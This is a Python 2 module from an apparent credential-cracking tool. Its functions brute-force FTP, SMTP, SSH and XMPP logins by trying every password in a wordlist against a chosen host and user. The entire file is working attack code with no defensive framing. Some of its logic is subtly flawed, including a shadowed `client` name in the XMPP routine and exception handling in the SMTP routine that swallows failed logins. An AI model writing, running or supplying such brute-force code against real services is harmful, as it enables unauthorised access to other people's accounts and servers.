'''
protocols.py - Core module for network protocol bruteforcing

Category: Core 
Description: 
    This module provides the methods for bruteforcing network protocols.
    Using a multitude of Python libraries, protocols attempts to authenticate with
    the specified service through its respective library.  
    These include:
    - ssh
    - ftp
    - smtp
    - XMPP

Dependencies: mainLib > smtplib, paramiko, xmpp, ftplib

Version: v1.0.0
Author: ex0dus
License: GPL-3.0 || https://opensource.org/licenses/GPL-3.0

'''

from src.mainLib import *


## FTP - File Transfer Protocol

def ftpBruteforce(address, username, wordlist, delay, port):
    wordlist = open(wordlist, 'r')
    for i in wordlist.readlines():
        password = i.strip("\n")
        try:
            ftp = FTP()
            ftp.connect(address, port)
            ftp.login(username, password)
            ftp.retrlines('LIST')
            print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
            ftp.quit()
        except ftplib.all_errors as e:
            print "Error caught! Name: %s" % type(e).__name__ 
        except KeyboardInterrupt:
            ftp.quit()
        except:
             print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
             sleep(delay)

## SMTP - email

def smtpBruteforce(address, username, wordlist, delay, port):
    wordlist = open(wordlist, 'r')
    for i in wordlist.readlines():
        password = i.strip("\n")
        try:
            s = smtplib.SMTP(str(address), port)
            s.ehlo()
            s.starttls()
            s.ehlo
            s.login(str(username), str(password))
            print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
            s.close()
        except Exception, e:
            print R + "[!] OOPs something went wrong! Check if you have typed everything correctly, as well as the email address [!]" + W
        except KeyboardInterrupt:
            s.close()
            exit(1)
        except:
             print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
             sleep(delay)

## SSH - Secure SHell, connect AND bruteforce

def ssh_connect(address, username, password, port, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    paramiko.util.log_to_file("filename.log")

    try:
        # Connecting! Errors are indicated by code variable.
        ssh.connect(address, port=int(port), username=username, password=password)
    except paramiko.AuthenticationException:
        # Password did not authenticate.
        code = 1
    except socket.error, e:
        # Something went wrong.
        print R + "[!] Error: Connection Failed. [!]" + W
        code = 2

    ssh.close()
    return code



def sshBruteforce(address, username, wordlist, port, delay):
    wordlist = open(wordlist, 'r')
    # Processing wordlist...
    for i in wordlist.readlines():
        password = i.strip("\n")
        try:
            response = ssh_connect(address, username, password, port)
            if response == 0:
                print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
            elif response == 1:
                print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
                sleep(delay)
            elif response == 2:
                print R + "[!] Error: Connection couldn't be established to address. Check if host is correct, or up! [!]" + W
                exit()
        except Exception, e:
            print e
            pass
        except KeyboardInterrupt:
            ssh.close()
            exit()

        wordlist.close()

def xmppBruteforce(address, port, username, wordlist, delay):
    xmppUser = username + "@" + str(address)
    wordlist = open(wordlist, 'r')
    for i in wordlist.readlines():
        password = i.strip("\n")
        try:
            jid = protocol.JID(xmppUser)
            client = client(jid.getDomain(), debug = [])
            client.connect(str(address), port)
            if client.auth(jid.getNode(), password):
                client.sendInitPresence()
                print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
                client.disconnect()
                exit()
        except KeyboardInterrupt:
            client.disconnect()
            exit()
        except:
            print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
            sleep(delay)

    
